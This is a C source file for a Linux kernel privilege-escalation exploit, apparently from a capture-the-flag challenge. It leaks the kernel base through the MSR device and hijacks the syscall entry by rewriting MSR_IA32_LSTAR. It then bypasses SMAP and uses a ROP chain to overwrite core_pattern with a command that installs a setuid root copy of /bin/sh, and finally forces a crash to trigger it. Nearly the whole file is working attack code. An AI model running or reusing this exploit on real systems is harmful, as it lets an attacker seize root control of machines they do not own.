/*
    Compile with x86_64-linux-gnu-gcc -g -static ./expl.c -no-pie -w -O1
*/

#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <sys/fcntl.h>
#include <unistd.h>
#include <string.h>
#include <sys/errno.h>

#define EXP_TAG      "\t[meow] "

#define MSR_COMPAT_SYS_TGT  0xc0000083ull
#define MSR_IA32_LSTAR      0xc0000082ull
#define MSR_FMASK           0xc0000084ull

#define OFF_COMPAT_SYS_ADDR 0x00801c70ull
#define OFF_PARANOID_CR3    0x00801745ull
#define OFF_POP_RDI_RET     0x001acd9dull
#define OFF_POP_RDX_RET     0x003957eeull
#define OFF_POP_RBX_RET     0x000ebfa9ull
#define OFF_POP_RAX_RET     0x003959b5ull 
#define OFF_POP_RCX_RET     0x003883d3ull

#define OFF_M_C4_BX_TST_JR8 0x005df18aull
#define OFF_CORE_PATTERN    0x00f5dd00ull
#define OR_CR3_IRETQ        0x0080158bull

#define OFF_MOV             0x0046dca4ull

#define BIT_AC              18

#define CPUID        "0"
#define MSR_PATH_FMT "/dev/cpu/" CPUID "/msr"

#define __INTEL_ASM__(insts) __asm__( \
    ".intel_syntax noprefix;" \
    insts \
)

#define DYN_GADGET(off) (kbase + (ull) off)

typedef unsigned long long ull;

int fd;
ull kbase; 
ull addr_pop_rax_ret;
ull addr_entry_SYSCALL_64;
ull user_ss, user_sp, user_rflags, user_cs; 


void panic(char *msg) {
    printf("%s: %s\n", EXP_TAG, msg);
    exit(-1);
}


void save_state(void) {
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "mov user_cs, cs;"

        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
}

void gracefull_shutdown() {
    puts(EXP_TAG "Returned as CPL>0 after restoring MSR_IA32_LSTAR and payload execution");
    _exit(0);
}

void *P_gracefull_shutdown = (void *) &gracefull_shutdown;


/*
    This assembly snippet emulates stac behaviour while CPL>0.

    - stac can temporary force neglecting the SMAP (according to https://www.felixcloutier.com/x86/stac)
    - stac is privileged instruction that's only allowed to be executed in Ring-0. 
*/

void emu_stac(void) {
    __INTEL_ASM__(
        "pushfq;"
        "popq rax;"
        "or rax, 0x40000;"           // 1 << BIT_AC
        "pushq rax;"
        "popfq;"
        "ret;"
        ".att_syntax;"
    );
}

/*
    Before returning from interrupt context, restore MSR_IA32_LSTAR 
    This will be executed with CPL=0 so we need to return to user space with sysretq
*/
void handle_sysret(void) {
    __INTEL_ASM__ (
        "mov r8, %0;"
        "mov rcx, 0xc0000082;"

        "mov rax, r8;"          
        "mov rdx, r8;"

        "shl rax, 32;"
        "shr rax, 32;"
        "shr rdx, 32;"    

        "wrmsr;"

        // Now return to gracefull shutdown with user context
        "mov rcx, P_gracefull_shutdown;"
        "mov r11, user_rflags;"
        "sysretq;"

        ".att_syntax;"
            :
            : "r"(addr_entry_SYSCALL_64)
            :
    );
}

void *P_handle_sysret = (void *) &handle_sysret;

/*
    MSR interfaces: READ/WRITE 8b chunks with seeking to offset of addr.

    returns ENXIO when incorrect cpuid specified
*/

int msr_open() {
    puts(EXP_TAG "Opening the device");

    int mfd = open(MSR_PATH_FMT, O_RDWR);
    if(mfd < 0) {
        if(mfd == ENXIO) {
            puts(EXP_TAG "bad cpuid used!");
        }
        
        panic("failed to open MSR interface");
    }

    return mfd;
}

ull msr_read(void *addr) {
    ull res;

    if((pread(fd, &res, sizeof(res), addr)) != sizeof(res)) {
        panic("failed to read chunk (MSR)");
    }

    return res;
}

void msr_write(void *addr, ull value) {
    if((pwrite(fd, &value, sizeof(value), addr)) != sizeof(value)) {
        panic("failed to write chunk (MSR)");
    }
}


void pwn(int offset, char payload) {
    save_state();

    fd = msr_open();

    // Leak kaslr
    ull compat_table = msr_read((void *) MSR_COMPAT_SYS_TGT);
    kbase = compat_table - OFF_COMPAT_SYS_ADDR;
    
    printf(EXP_TAG "Leaked kbase <addr: %p>\n", kbase);
    printf(EXP_TAG "Good addresses <emu_stac: %p; paranoid: %p >\n", emu_stac, (void *) (OFF_PARANOID_CR3+kbase));
    printf(EXP_TAG "Will return to: <handle_sysret: %p>\n", handle_sysret);

    // Save entry_SYSCALL_64
    addr_entry_SYSCALL_64 = msr_read((void *) MSR_IA32_LSTAR); 
    addr_pop_rax_ret = DYN_GADGET(OFF_POP_RAX_RET);

    printf(EXP_TAG "Saved entry_SYSCALL_64: <addr: %p>\n", addr_entry_SYSCALL_64);

    /* Update MSR_FMASK before continuing;
       We need to do that because rflags will be masked with FMASK while performing SYSCALL;

       snippet:
            RFLAGS := RFLAGS AND NOT(IA32_FMASK);

       Link: https://www.felixcloutier.com/x86/syscall
    */
    msr_write((void *) MSR_FMASK, ~(1 << BIT_AC));

    // Rewrite with some addr, trigger syscall 
    msr_write((void *) MSR_IA32_LSTAR, OFF_PARANOID_CR3+kbase);
    
    // Update flags for neglecting smap 
    emu_stac();

    // Prepare rop-chain
    ull gadgets_ya_blasters[] = {
        DYN_GADGET(OFF_POP_RBX_RET),
        0x6f0,
        DYN_GADGET(OFF_POP_RDX_RET),
        0x0,
        DYN_GADGET(OFF_M_C4_BX_TST_JR8),
        0x00000000ull + payload<<8,                         // Will be used by pop rax after jumping to r8
        DYN_GADGET(OFF_POP_RCX_RET),
        DYN_GADGET(OFF_CORE_PATTERN)+offset,
        DYN_GADGET(OFF_MOV),

        DYN_GADGET(OR_CR3_IRETQ),               // Now we need to change cr3 again and return handle_sysret with CPL=0

        // Form fake frame (2 fakes)
        0,
        0,

        (ull) P_handle_sysret,
        0x10,                     // Save ring0, GDT
        0x46,                     // Disable interrupt context   
        user_sp,                                
        0x18,                     
    };
    

    __INTEL_ASM__(
        "mov r8, addr_pop_rax_ret;"            // Here we'll jump after masking the cr4; RV not clobbered

        "mov rsp, %0;"                         // After executing paranoid_entry,
                                               // rsp still point to our address
        ".att_syntax;"
            :
            :"r"(gadgets_ya_blasters)
    );

    __asm__(
        "syscall;"
    );
}

int main(int argc, char **argv) {
    if(argc == 1) {
        // Create posthook
        char *target = "|/usr/bin/install -m 4755 -o root -g root /bin/sh /pwned\x00";

        for(int i = 0; i < strlen(target); i += 1) {
            char* cmd = (char*)malloc(256);
            sprintf(cmd, "%s %d '%c'\x00", argv[0], i, target[i]);

            printf("Overwriting the core_pattern <offset: %d; value: %c>\n", i, target[i]);
            system(cmd);
        }

        // Trigger posthook with
        *((ull *) 0xb1ba) = 0xb0ba;

    } else {
        int off = atoi(argv[1]);
        char p = argv[2][0];
        
        pwn(off, p);
    }
    return -1;
}